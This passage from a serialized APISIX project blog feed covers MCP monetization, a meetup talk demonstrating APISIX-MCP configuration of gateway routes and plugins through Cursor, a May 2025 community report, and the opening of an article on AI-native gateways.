detailed logs for troubleshooting and optimization.\\n\\nWith these capabilities, developers can identify performance bottlenecks, optimize resource allocation, and improve the overall user experience.\\n\\n### 6. Extensibility with Plugins\\n\\nAPI gateways offer a **plugin ecosystem** that enables developers to extend functionality and automate workflows. For MCP monetization, plugins can:\\n\\n- Automate **model versioning** and rollbacks.\\n- Integrate APIs with **payment gateways** for billing and subscription management.\\n- Enable custom workflows for specific use cases, such as pre-processing requests or caching responses.\\n\\nThis flexibility empowers developers to adapt their monetization strategies to evolving business needs.\\n\\n## Conclusion\\n\\nMonetizing MCP-driven AI models is essential for thriving in today\'s AI economy. By leveraging strategies like API-based monetization, marketplace integration, and value-added services, developers can unlock significant revenue potential.\\n\\n**API gateways** like Apache APISIX serves as a cornerstone for this journey, providing the tools needed to manage, secure, and scale MCP-driven APIs effectively. Whether you\'re a developer, an enterprise, or an innovator, embracing MCP and API gateways is key to navigating the AI economy."},{"id":"Configure APISIX in a Single Command with APISIX-MCP","metadata":{"permalink":"/blog/2025/06/04/configure-apisix-in-a-single-command-with-apisix-mcp","source":"@site/blog/2025/06/04/configure-apisix-in-a-single-command-with-apisix-mcp.md","title":"Configure APISIX in a Single Command with APISIX-MCP","description":"This article is based on Zhihuang Lin\'s presentation at the APISIX Shenzhen Meetup on April 12, 2025.","date":"2025-06-04T00:00:00.000Z","formattedDate":"June 4, 2025","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":16.7,"truncated":true,"authors":[{"name":"Zhihuang Lin","title":"author","url":"https://github.com/oil-oil","image_url":"https://github.com/oil-oil.png","imageURL":"https://github.com/oil-oil.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"MCP Monetization: Navigating the AI Economy","permalink":"/blog/2025/06/18/mcp-monetization-navigating-ai-economy"},"nextItem":{"title":"2025 Monthly Report (May 01 - May 30)","permalink":"/blog/2025/05/30/2025-may-monthly-report"}},"content":"> Author: Zihuang Lin, Frontend Developer & Product Manager at API7.ai. This article is based on Zhihuang Lin\'s presentation at the APISIX Shenzhen Meetup on April 12, 2025.\\n\x3c!--truncate--\x3e\\n\\nThis presentation is divided into five sections: limitations of large AI language models, what MCP is and its utility, the implementation principles and advantages of MCP, APISIX\'s practice based on MCP, and an APISIX-MCP demo.\\n\\n## Current Applications of AI Large Language Models\\n\\nAI has integrated into various aspects of our lives. Here are some application scenarios for large AI language models:\\n\\n- **Interactive**: Interview simulations, language practice, intelligent customer service.\\n- **Content Generation**: Paper editing, technical documentation organization, video script creation.\\n- **Programming Assistance**: Code suggestions (e.g., Cursor/Windsurf) and generation, bug troubleshooting.\\n- **Multimodal**: Image, audio, and video generation.\\n\\nAs AI capabilities continuously improve and costs decrease, our expectations for it are rising. We are no longer satisfied with single-point functions; we hope to form a complete demand closed-loop. Let\'s look at three typical scenarios:\\n\\n- **Scenario 1, Daily Office**: \\"Help me send a follow-up email to Manager Zhang, attach yesterday\'s meeting minutes PDF, and schedule a call with him next Tuesday at 3 PM.\\"\\n- **Scenario 2, Development**: \\"Develop an application for a sports wristband to record daily water intake, with a button counting function and chart statistics, then publish it to the app store.\\"\\n- **Scenario 3, Operations**: \\"Server CPU load has continuously exceeded 90%. Help me investigate the cause and try to fix it.\\"\\n\\nHowever, even the most advanced AI currently struggles to handle these scenarios perfectly, primarily due to the inherent limitations of large language models.\\n\\n## Limitations of AI LLMs\\n\\nCurrent model limitations are mainly in two aspects: data silos and the \\"missing hands and feet\\" problem.\\n\\nThe data silo problem is like \\"a clever housewife cannot cook without rice.\\" The knowledge of large AI language models is based on a knowledge snapshot from a past point in time. For example, if you ask it to send an email to Manager Zhang, it might not know who Manager Zhang is or what his email address is. Similarly, for wristband app development or CPU load troubleshooting, without the latest documentation or system context information, AI has no way to start.\\n\\n![Limitations of LLMs](https://static.api7.ai/uploads/2025/06/05/SCwZYwBO_1-limitations-of-ai-llms.webp)\\n\\nThe second limitation is the lack of \\"hands and feet.\\" Models are good at generating content but lack execution capabilities.\\n\\nWant AI to actually send emails? We might need to provide it with email-related APIs. Expecting automatic app publication to a store? It requires integration with the app store\'s publishing interface. Handling server failures? Ultimately, operations personnel still need to manually execute troubleshooting commands.\\n\\nThe AI content consumption process includes four stages:\\n\\n1. **User Query (Provide more detailed information)**: The user provides basic background information (text, images, etc.) and asks a question.\\n2. **Content Generation (Model fine-tuning)**: The large AI model generates content such as text, images, audio, or video.\\n3. **Content Consumption (Provide tools for corresponding actions)**: Requires manual execution by the user or automated execution of tasks through tools.\\n4. **Task Completion (Provide tools to check execution results)**: Finally, the user or system obtains the execution results.\\n\\nTo optimize this process, we can:\\n\\n1. First, in the user query stage, we need to provide as much detailed context information as possible. For example, in the email scenario, if we need to send an email to a specific user, we directly provide the email address to the large AI language model or provide system metrics to help the AI model generate more accurate content.\\n2. In the content generation stage, through model fine-tuning, the large AI model can specifically learn special capabilities in a certain field to enhance its knowledge base.\\n3. In the content consumption and task confirmation stages, provide tools for the large AI language model. For example, after an email is sent, provide an API to read sent emails so that the large AI language model can determine if the operation was successful by checking the send response.\\n\\n### Existing Solutions\\n\\nAlthough large AI language models have their limitations, some corresponding solutions already exist.\\n\\n![Solutions for LLMs](https://static.api7.ai/uploads/2025/06/05/Vjp2tlXP_2-solutions-of-ai-llms.webp)\\n\\n#### RAG (Retrieval-Augmented Generation)\\n\\nFirst is RAG (Retrieval-Augmented Generation), which allows large AI language models to access external knowledge bases and obtain the latest data. For example, by integrating wristband development documentation, the AI can learn specifically about it. When we ask a question, it first retrieves relevant information from the knowledge base, then sends this information along with the question to the AI, allowing the AI to generate more accurate content.\\n\\n#### Function Calling\\n\\nNext is OpenAI\'s Function Calling, which solves the problem of large AI language models calling tools. With it, we can enable AI to call external tools, such as APIs or functions, thereby addressing the issue of AI not being able to directly operate real-world systems.\\n\\nWhen conversing with AI, we can specify some tools, such as providing an email sending API and specifying the recipient when sending an email. The AI will analyze the semantics, identify the need to send an email, call the corresponding tool, generate parameters based on the context, and finally pass the tool execution result back to the model to generate the final reply.\\n\\n### Limitations of Existing Tools\\n\\n![Limitations of LLM Tools](https://static.api7.ai/uploads/2025/06/05/rNO2Hqrr_3-limitations-of-existing-tools.webp)\\n\\nDespite these solutions, the three scenarios mentioned earlier still cannot be perfectly resolved because existing tools also have some limitations.\\n\\nFirst, the technical maturity is insufficient. RAG technology relies on chunking and vector search, where chunking can lead to text context information discontinuity. Although knowledge bases seemingly provide additional knowledge, their actual performance is not as ideal. For example, a Markdown document, originally with a complete introduction and summary, might only retrieve a part of it after chunking. Meanwhile, Function Calling technology requires pre-defining the input and output structures of APIs, which offers less flexibility. If the business frequently changes, such as in email sending scenarios that also require system data, the maintenance cost is very high.\\n\\nSecond, integration costs are high. Whether it\'s RAG or Function Calling, enterprises need to modify existing data structures or API architectures, which is high-cost and low-return for small teams with insufficient technical reserves. Moreover, models iterate quickly; what works well today might perform worse after a model update tomorrow. Additionally, Function Calling is a closed-source solution, leading to vendor lock-in issues and making cross-model expansion difficult. When enterprises have sensitive data, it\'s inconvenient to provide it to third-party platforms, requiring self-handling, which further increases integration complexity. It is precisely these limitations of existing tools that prompt vendors to consider whether there is a better solution.\\n\\n## Detailed Introduction to MCP\\n\\nThe emergence of MCP (Model Context Protocol) addresses some of the limitations of existing tools. MCP was introduced by Anthropic in late November 2024, aiming to become the USB-C interface for AI applications, unifying the communication protocol between models and external tools.\\n\\n![Limitations of LLM Tools](https://static.api7.ai/uploads/2025/06/05/iqmrV2gf_4-what-is-mcp.webp)\\n\\nThis image is widely circulated in the community and vividly illustrates the role of MCP: comparing a computer to an MCP client, the MCP protocol to a docking station, and different MCP services to data cables. Through the docking station and data cables, the MCP client can quickly connect to various external services, such as Slack, Gmail, Facebook, etc.\\n\\n### MCP Usage Scenarios\\n\\nLet\'s look at what MCP does in practical scenarios.\\n\\n![Using Scenarios of MCP](https://static.api7.ai/uploads/2025/06/05/VZqktNxy_5-use-cases-of-mcp.webp)\\n\\n- **GitHub MCP**: We can instruct the large AI language model to \\"create a PR to the `main` branch based on modifications in the `feature/login` branch, with the title \'fix: user login page optimization\', and @ team members Alice and Bob for review.\\" After receiving the request, the large AI language model will analyze the semantics, then call the `create_pull_request` tool, generate and populate parameters based on the context information.\\n\\n- **Figma MCP**: We can tell AI: \\"Convert the login page design in Figma into React + Tailwind code.\\" After analyzing the semantics, AI uses Figma MCP to obtain precise dimensions, colors, and layout data from the design draft. By integrating Figma\'s open API, we obtain specific layer data and convert it into corresponding code as required.\\n\\n- **Browser Tools MCP**: We can tell AI: \\"Help me fix this `React hydration` error based on the DOM node reported in the console.\\" The MCP tool will help AI obtain browser console logs or DOM node data. After AI reads and analyzes them, it can locate and fix the code issue.\\n\\n### MCP Ecosystem\\n\\nThe MCP service ecosystem is thriving. The following screenshot is from an MCP resource hub (mcp.so). It lists existing MCP services, including file systems, alert systems, automation testing databases, or sending requests. Many brands and vendors have launched their own MCP services.\\n\\n![MCP Ecosystem](https://static.api7.ai/uploads/2025/06/05/uILI1Nav_6-mcp-ecosystem.webp)\\n\\n### Reasons for MCP\'s Rapid Growth\\n\\nMCP has gained rapid popularity for the following reasons:\\n\\n**1. The \\"Last Mile\\" for AI Agent Implementation**\\n\\nMCP solves practical problems by allowing AI to easily connect to various tools, such as database APIs and enterprise software. By the end of 2024, enterprises are pursuing AI implementation, and MCP fills the most critical gap.\\n\\n**2. Explosive Growth of Community and Ecosystem**\\n\\n- Initially, MCP was not very popular. However, large enterprises like Block, Replit, and Codeium were the first to adopt MCP for functional implementation, setting an example and building confidence for other developers and enterprises.\\n\\n- Developer-friendly: The MCP protocol provides SDKs, sample code, and documentation, significantly lowering development barriers. Although the early MCP service ecosystem was not perfect, mainstream MCP services like Figma and GitHub were widely used by developers due to their convenience and ease of use. As demand increased, the number of developers grew, and the MCP ecosystem gradually formed.\\n\\n**3. The \\"Lingua Franca\\" of the AI World**\\n\\n- MCP is compatible with various models such as Claude, ChatGPT-4, and DeepSeek, without vendor lock-in, and is led by Anthropic, providing industry endorsement.\\n\\n- It is based on the LSP (Language Server Protocol) architecture, which is similar to how editors like VS Code and Cursor support multiple programming languages. The LSP architecture helps editors quickly integrate various language features, standardizing behaviors for developers to implement specific logic.\\n\\n**4. Continuously Evolving Protocol Standards**\\n\\nThe MCP protocol is constantly evolving. Anthropic continues to actively promote its development after release, adding more features to enterprise protocols and ecosystems, such as identity authentication, cloud-connected central registries, and other enterprise-grade new features. At the same time, Anthropic actively participates in AI conferences and seminars to promote this technology.\\n\\n### MCP Architecture\\n\\n![MCP Architecture](https://static.api7.ai/uploads/2025/06/06/Cd0weD3t_mcp-architecture-en.webp)\\n\\nOn the far left is the MCP client host, which refers to the AI clients we usually use, such as Claude, Cursor, or Windsurf. They interface with MCP services via the MCP protocol. An MCP client host can connect to multiple MCP services, such as GitHub MCP or Figma MCP. We can even combine these services, for example, by pulling code from GitHub first and then generating Figma design drafts.\\n\\nIn addition to interacting with client hosts, MCP services also interact with local data sources or internet data sources. For instance, through GitHub\'s open API, when using an MCP service, we pass a token to access GitHub data. The overall MCP architecture is relatively simple; it does not directly interact with large AI language models but rather through client hosts.\\n\\n### Core Concepts in MCP\\n\\nThere are 6 core concepts in MCP: Tools, Resources, Prompts, Sampling, Roots, and Transports. Among these concepts, Tools are the most commonly used, with 95% of MCP services utilizing them.\\n\\n![MCP Concepts](https://static.api7.ai/uploads/2025/06/05/GyuQ4KXK_8-core-concepts-of-mcp.webp)\\n\\n#### Tools\\n\\nTools are the way MCP services expose functionalities to the client. Through tools, AI can interact with external systems, perform computations, and take actions in the real world. Its implementation structure is: `tool(tool name, tool description, input parameter format, callback function)`.\\n\\n![MCP Tools](https://static.api7.ai/uploads/2025/06/05/nKAAsSuk_12-example.webp)\\n\\nTools can be used by MCP services to expose executable content to clients. Through tools, large AI language models can interact with external systems to perform computations. A tool is a function on the MCP instance that can accept up to four parameters.\\n\\nFor example, suppose we want to implement a tool to obtain weather data. We can name the tool `get_weather`, and the tool description would be \\"Retrieve weather information for a specified city, which can be queried by city name or longitude and latitude coordinates.\\" The large AI language model will refer to the tool name and description for semantic analysis when deciding whether to call an MCP tool. The third parameter is the input parameter format, which describes how the AI needs to construct parameters when calling this tool.\\n\\nThe fourth parameter is the callback function, which determines what operation we need to perform after the large AI model calls our tool. For instance, we can write an operation that simulates sending a request. When the large AI language model calls our tool, we will send a request to an external weather service, retrieve the data, and then return it to the large AI language model.\\n\\n![MCP Tool Workflow](https://static.api7.ai/uploads/2025/06/05/jYstzYB2_9-tools-invocation-process.webp)\\n\\nFrom the above flowchart, it can be seen that when a user makes a request (e.g., querying Beijing weather), the system has already integrated an MCP service to obtain weather information. MCP will provide the AI with a list of tools, such as `get_weather` or `search_news`, each with a corresponding name and description. The large AI language model will parse the semantics, match the most suitable tool (e.g., `get_weather` when querying Beijing weather), and then generate corresponding parameters (e.g., `city: Beijing`) based on the predefined input parameter format (e.g., `city: parameter_style`).\\n\\nAfter parameters are generated, they are passed to the MCP service. The system calls the tool and sends an API request, and the tool returns JSON data in response. Some of this JSON data is simple and easy to read, while some is more complex, but ultimately it is provided to the large AI language model, which then summarizes it into a natural language result that humans can understand and feeds it back to the user.\\n\\n## APISIX-MCP Practices\\n\\nAPISIX is a high-performance API Gateway. Due to its extensive functionalities, it contains many resource types, such as services, routes, and upstreams, making the learning curve for beginners quite steep. To address this, APISIX-MCP was developed with the goal of simplifying API management processes and lowering technical barriers through natural language. The core function of APISIX-MCP is to configure routes and manage upstream services and various other APISIX resources using natural language.\\n\\nCurrently, APISIX-MCP supports operations on the following resource types:\\n\\n![Operations supported by APISIX-MCP](https://static.api7.ai/uploads/2025/06/05/N2HyscJd_10-operations-supported-by-apisix-mcp.webp)\\n\\nOverall, all resources within APISIX can be interacted with using natural language. We also provide features to verify whether configurations are effective, such as asking AI to send requests to the gateway to validate and request results. As long as the APISIX service address is defined in the environment variables, after performing an operation, AI can verify whether the operation was successful.\\n\\n## Demo\\n\\n### APISIX-MCP Configuration\\n\\nIn this demo, I use Cursor as the AI client. If you use MCP, the process is similar.\\n\\nFirst, click on the settings in the top right corner. In the left sidebar, there is an MCP section, which I have pre-configured. If it\'s empty, click \\"Add new global MCP\\" to navigate to the configuration file.\\n\\n```json\\n{\\n  \\"mcpServers\\": {\\n    \\"apisix-mcp\\": {\\n      \\"command\\": \\"npx\\",\\n      \\"args\\": [\\"-y\\", \\"apisix-mcp\\"],\\n      \\"env\\": {\\n        \\"APISIX_SERVER_HOST\\": \\"your-apisix-server-host\\",\\n        \\"APISIX_ADMIN_API_PORT\\": \\"your-apisix-admin-api-port\\",\\n        \\"APISIX_ADMIN_API_PREFIX\\": \\"your-apisix-admin-api-prefix\\",\\n        \\"APISIX_ADMIN_KEY\\": \\"your-apisix-api-key\\"\\n      }\\n    }\\n  }\\n}\\n```\\n\\nIn the \\"mcpServers\\" field, I added a service named `apisix-mcp`; you can customize the name. After configuration, you need to run a command to start the MCP service. I\'m using Node.js\'s command-line tool npx for this operation. APISIX\'s MCP has already been published to the npm package manager and can be obtained directly online. You can choose the corresponding tool based on your development language.\\n\\nThe `-y` parameter means to allow dependency installation by default. `apisix-mcp` refers to the service name. In addition to the first two parameters, you can also pass extra environment variables, but APISIX-MCP\'s environment variables have default values. If your APISIX runs locally without configuration changes, you can use the default environment variables without specifying them.\\n\\nAfter configuration, a new service named `apisix-mcp` will appear in the MCP section. The green dot indicates a successful connection, and it will display the tools it provides.\\n\\n![APISIX-MCP Tools](https://static.api7.ai/uploads/2025/06/06/ypIeLxZK_1-apisix-tools.webp)\\n\\n### APISIX-MCP Scenario Demo\\n\\nNext, I will demonstrate practical examples.\\n\\n#### Create a Route\\n\\nI\'ve set up some scenarios, for instance, asking APISIX-MCP to \\"help me create a route pointing to `https://httpbin.org` with an ID of `httpbin`, proxying `/ip` requests, and sending a request to the gateway to verify successful configuration.\\"\\n\\nAfter parsing our semantics, it finds that we need to call the MCP service to implement the functionality. Here, it calls a tool, specifically the parameters within `create_roots`. We have provided the context, so click \\"run tool\\" to confirm. In a production environment, operations-level configurations are crucial and cannot be changed arbitrarily, hence this confirmation step is necessary.\\n\\nAfter clicking \\"run tool,\\" we can see the response, understanding the specific actions after calling the API, including what functions it will execute, sending requests to the gateway, and verifying if the route was successfully created. Click \\"run tool\\" again, and the creation is successful.\\n\\n![Create a Route](https://static.api7.ai/uploads/2025/06/06/YWFgEXJv_2-apisix-demo-en.webp)\\n\\nWe don\'t need to pay too much attention to these response contents; the system will automatically create the route and send test requests for verification, finally summarizing the execution results. If you manually configure these operations, you\'d need to set API keys in the command line and build complete test commands. If you make a mistake during the operation and don\'t notice it in time, you\'d have to spend extra time troubleshooting.\\n\\n#### Configure Load Balancing\\n\\nWe will adjust the existing route. We add an upstream node to the route we just created, pointing to `mock.api7.ai` with the prefix changed to `/headers`, using the upstream node\'s host for host pass-through, and applying a least-connections load balancing strategy. Then, we send ten requests to the gateway to verify successful configuration.\\n\\n![Configure Load Balancing](https://static.api7.ai/uploads/2025/06/06/30qqIOAZ_3-apisix-demo-en.webp)\\n\\n#### Configure Authentication\\n\\nIn the third step, enable the `key-auth` plugin for the route with ID `httpbin`, then create a consumer named `zhihuang` with `key-auth` enabled. Ask AI to randomly generate a secure key and tell me, then send a request to the gateway to verify successful configuration.\\n\\n![Configure Authentication](https://static.api7.ai/uploads/2025/06/06/0q5QxuIk_4-apisix-demo-en.webp)\\n\\nMCP automatically enabled the `key-auth` authentication plugin, created a consumer, and performed verification based on the randomly generated consumer credentials. During the verification process, it first tests requests with credentials, then tests requests without credentials, confirming that the configuration is correctly completed.\\n\\n### Configure Plugins\\n\\nFinally, configure plugins, asking AI to \\"enable cross-origin for my `httpbin` route, then configure rate limiting to allow only two requests per minute, responding with `503` for exceeding requests, and then send a request to the gateway to verify successful configuration.\\"\\n\\n![Configure Plugins](https://static.api7.ai/uploads/2025/06/06/QucQJBVZ_5-apisix-demo-en.webp)\\n\\n## Summary\\n\\nMCP opens up many possibilities. While it might not be entirely stable yet, its application scenarios will become increasingly rich as model capabilities improve. We use generalized language to achieve goals, allowing large AI language models to quickly generate solutions. Now, we only need to state our requirements, and AI can complete the entire closed-loop demand, greatly simplifying daily operations and development. This holds significant value at all levels, and the barrier to entry is very low.\\n\\nIf you wish to develop similar MCP services, you only need to be familiar with any programming language like Java, Go, or JS, and you can complete the integration in a day, helping enterprises quickly connect their APIs to large AI language models.\\n\\nThe value of APISIX-MCP lies in helping new users quickly get started with APISIX and providing an intelligent new solution for complex API management. It transforms executing specific operations into describing generalized scenarios, promoting the deep integration of AI and API management. In the future, we will further explore the integration with AI management at the API management level and continuously enhance APISIX\'s ability to handle AI traffic at the gateway level."},{"id":"2025 Monthly Report (May 01 - May 30)","metadata":{"permalink":"/blog/2025/05/30/2025-may-monthly-report","source":"@site/blog/2025/05/30/2025-may-monthly-report.md","title":"2025 Monthly Report (May 01 - May 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-05-30T00:00:00.000Z","formattedDate":"May 30, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.435,"truncated":true,"authors":[],"prevItem":{"title":"Configure APISIX in a Single Command with APISIX-MCP","permalink":"/blog/2025/06/04/configure-apisix-in-a-single-command-with-apisix-mcp"},"nextItem":{"title":"APISIX AI Gateway: From Cloud-Native to AI-Native","permalink":"/blog/2025/05/29/apisix-ai-gateway-from-cloud-native-to-ai-native"}},"content":"> Recently, we\'ve introduced several new features, including adding the `lago` plugin, adding the support for incremental API configuration updates in Standalone mode, a health checker for the stream subsystem, and a new Standalone Admin API. For more details, please read this month\u2019s newsletter.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom May 1st to May 30, 8 contributors made 39 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/05/30/0OnqOGTo_may-contributor-list.webp)\\n\\n## Feature Highlights\\n\\n### Add Metadata to Resource Schema\\n\\nPR: https://github.com/apache/apisix/pull/12224\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR refactors the resource schema to ensure that user-facing resources include a standardized `metadata` section with `name`, `desc`, and `labels` fields. This improves consistency and helps resolve issues in downstream projects like APISIX dashboard and APISIX\'s declarative CLI (ADC).\\n\\n### Add `lago` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12196\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nAdd `lago` plugin to allow users to use APISIX as a monetization gateway, allowing them to charge subscribers based on API consumption. This can be applied in AI cloud platforms to charge by consumed tokens\u2014similar to OpenAI and Deepseek\u2014or to charge for access to specific APIs, such as monetized weather data services.\\n\\n### Support Revision in API-Driven Standalone Mode like etcd\\n\\nPR: https://github.com/apache/apisix/pull/12200\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nIn standalone mode, APISIX\'s Admin API requires clients to fetch the entire configuration on every sync. As configurations grow or change frequently, this full-sync mechanism causes excessive network traffic and latency when applying updates. Additionally, frequent resource changes trigger a complete rebuild of the internal radixtree, degrading route lookup performance under high churn. In service discovery scenarios where upstreams are frequently updated, we aim to update only upstream data without impacting other resources.\\n\\n### Support Revision in API-Driven Standalone Mode like etcd\\n\\nPR: https://github.com/apache/apisix/pull/12200\\n\\nContributor: [AlinsRan](https://github.com/AlinsRan)\\n\\nIn standalone mode, APISIX\'s Admin API requires clients to fetch the entire configuration on every sync. As configurations grow or change frequently, this full-sync mechanism causes excessive network traffic and latency when applying updates. Additionally, frequent resource changes trigger a complete rebuild of the internal radixtree, degrading route lookup performance under high churn. In service discovery scenarios where upstreams are frequently updated, we aim to update only upstream data without impacting other resources.\\n\\n### Support Health Checks on L4\\n\\nPR: https://github.com/apache/apisix/pull/12180\\n\\nContributor: [nic-6443](https://github.com/nic-6443)\\n\\nThis PR added support for health checks when APISIX is operating as an L4 (stream) proxy.\\n\\n### Add Standalone Admin API\\n\\nPR: https://github.com/apache/apisix/pull/12179\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR introduces a dedicated Admin API for Standalone mode, enabling users to update in-memory configurations without relying on the file system, further enhancing statelessness. Configurations can be submitted via HTTP PUT in JSON or YAML format. This feature supports use cases like the Ingress Controller by removing the dependency on static configuration files.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [APISIX Gateway Practices in Tencent Games](https://apisix.apache.org/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi/)\\n\\n  This article details how Tencent Games\' Timi Studio Group customized its API gateway based on APISIX. It played a critical role in meeting strict compliance requirements for overseas operations, reducing development and operations costs, and improving system flexibility and reliability.\\n\\n- [APISIX Gateway Practices in Honor\'s Massive Business](https://apisix.apache.org/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business/)\\n\\n  This article explains in detail how Honor adopted APISIX as its API gateway. Since introducing APISIX in 2021, Honor has continuously optimized and extended the platform to build a high-performance, scalable, and reliable gateway that effectively supports its rapidly growing business at scale.\\n\\n- [From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway](https://apisix.apache.org/blog/2025/04/21/host-mcp-server-with-api-gateway/)\\n\\n  Discover how the Apache APISIX `mcp-bridge` plugin seamlessly converts stdio-based MCP servers to scalable HTTP SSE services."},{"id":"APISIX AI Gateway: From Cloud-Native to AI-Native","metadata":{"permalink":"/blog/2025/05/29/apisix-ai-gateway-from-cloud-native-to-ai-native","source":"@site/blog/2025/05/29/apisix-ai-gateway-from-cloud-native-to-ai-native.md","title":"APISIX AI Gateway: From Cloud-Native to AI-Native","description":"This article is based on Yuansheng\'s presentation at the APISIX Shenzhen Meetup on April 12, 2025.","date":"2025-05-29T00:00:00.000Z","formattedDate":"May 29, 2025","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":14.645,"truncated":true,"authors":[{"name":"Yuansheng Wang","title":"author","url":"https://github.com/membphis","image_url":"https://github.com/membphis.png","imageURL":"https://github.com/membphis.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"2025 Monthly Report (May 01 - May 30)","permalink":"/blog/2025/05/30/2025-may-monthly-report"},"nextItem":{"title":"APISIX Gateway Practices in Tencent Games","permalink":"/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi"}},"content":"> Authors: Yuansheng Wang, Apache APISIX PMC member, Apache member, Co-founder & CTO of API7.ai, and author of *Apache APISIX in Action*. This article is based on Yuansheng\'s presentation at the APISIX Shenzhen Meetup on April 12, 2025.\\n\x3c!--truncate--\x3e\\n\\n## The Focus of the AI Era \u2014 Why\\n\\nIn 2015, I co-founded the open-source project APISIX with Ming Wen, and in 2019, we donated APISIX to the Apache Software Foundation. Over the past six years, from my personal perspective, its achievements have been remarkable. Initially, our goal was simple: to create an API gateway that could be used by others. However, as time went on, users from various fields began to adopt APISIX, such as Geely Automobile and Honor Mobile. When these products use APISIX to serve me, it feels like a child I created is giving back to its parents. This positive cycle is truly inspiring.\\n\\nIn the past two to three years, the rapid pace of technological development has been continuously changing our world. Initially, I thought I had little to do with AI development. However, after personally using AI, I found it to be extremely helpful. Now, in our daily work, we almost can\'t do without AI. However, the most challenging part of using AI is asking the right questions.\\n\\nAI is essentially an empowering tool that can assist everyone, but the effectiveness of this assistance depends on the users. For example, if you have a high level of expertise, say 100 points, AI might help you improve to 120 points. But if you only have 50 points, it might only help you reach 60 points. Why is that? Because AI itself is static and can only serve as an auxiliary tool to humans. Different users will get different results when using it.\\n\\nIn the AI era, the most challenging part is asking the right questions. Meanwhile, to enhance one\'s position in society, the Golden Circle principle (Why, How, What) becomes crucial. Upon deeper reflection, we find that asking questions and the Golden Circle principle have significant overlap. The core of both lies in addressing the essential Why, rather than just focusing on the superficial What. Only by asking complete questions can we obtain the correct answers.\\n\\n**Introduction to Apache APISIX**\\n\\n[API7.ai](https://api7.ai/) is the original creator and donator of Apache APISIX. Currently, it takes the loin\'s share in the Chinese API management market. We serve over 300,000 services and process more than ten trillion requests daily. APISIX has the following features:\\n\\n- Fully dynamic, real-time, and high-performance\\n- high security and stability\\n- Its cloud-native architecture provides strong elasticity and scalability, making it well-adapted to modern cloud environments\\n- Offer flexibility in hot reloading\\n- Rich ecosystem, integrating with various technologies and tools\\n- Active community ensures continuous contributions from numerous developers and users to the project\'s development\\n\\nFor these reasons, APISIX is suitable for various scenarios, including enterprise north-south traffic gateways, east-west traffic application API gateways, Kubernetes Ingress Controllers, and service meshes. APISIX\'s applications have permeated almost every aspect of our daily lives. Whether you\'re hailing a taxi, calling an electric vehicle, conducting voice office work, making video calls, or trading stocks, APISIX is quietly providing support behind the scenes. Even fast-food chains like McDonald\'s and KFC, as well as virtually all domestic mobile phone and electric vehicle manufacturers, and even power bank providers, have APISIX\'s presence.\\n\\n![APISIX API Gateway Introduction](https://static.api7.ai/uploads/2025/05/30/lJWrLYEX_1-about-apache-apisix.webp)\\n\\n## Technical Evolution: From Cloud-Native to AI-Native\\n\\nCloud-native refers to systems can be elastically scaled to efficiently and swiftly respond to dynamically changing business demands. **AI-native builds upon this architecture, emphasizing the support for proxying AI model requests, particularly in conversational application scenarios.** Although these requests still use the HTTP protocol, consistent with traditional service requests, they exhibit significant differences in performance.\\n\\nSpecifically, AI request responses are typically slower. For instance, when a user poses a question to AI, the response time is often slower than traditional HTTP requests. In general, traditional HTTP requests usually have response times ranging from 10 to 100 milliseconds, with slightly longer ones completing within a few hundred milliseconds, essentially finishing interactions within one second. However, due to the generative computing nature of AI requests, response times are significantly prolonged.\\n\\n![Challenges in Cloud-Native Era](https://static.api7.ai/uploads/2025/05/30/7Uzq5grl_2-challenges-of-cloud-native-era.webp)\\n\\nFurthermore, AI applications introduce new security challenges. Taking internal corporate data as an example, in the past, people were most concerned about issues like Samsung\'s sensitive document leaks. In traditional business scenarios, enterprises rarely submit complete documents to external services, a process usually subject to strict and cautious evaluation. However, such operations are common in AI applications. For example, during rental or home purchasing processes, users may submit contract documents to AI models to analyze potential legal risks. Consequently, AI applications have triggered new internal information security requirements.\\n\\nFinally, when selecting AI services, enterprises must also consider cost comprehensively. Taking ChatGPT and DeepSeek as examples, although they have similar functional capabilities, DeepSeek is significantly more cost-effective. Enterprises need to balance investments and returns in terms of response speed, output quality, cost control, system stability, and reliability.\\n\\n## The Rise of AI and APISIX\'s Response\\n\\nAgainst the backdrop of the rise of AI applications, AI traffic characteristics differ significantly from traditional traffic. As a high-performance and highly scalable API gateway, APISIX can theoretically proxy all types of HTTP requests without technical obstacles. However, to proxy AI requests, additional performance and feature requirements must be met to accommodate the unique needs of AI services.\\n\\n![The Rise of AI](https://static.api7.ai/uploads/2025/05/30/RKgVorrr_3-rise-of-ai.webp)\\n\\nWhether for commercial or open-source users, in the context of enterprise-level AI service usage, selecting an AI gateway has become a necessary prerequisite. The reason enterprises need to deploy an AI 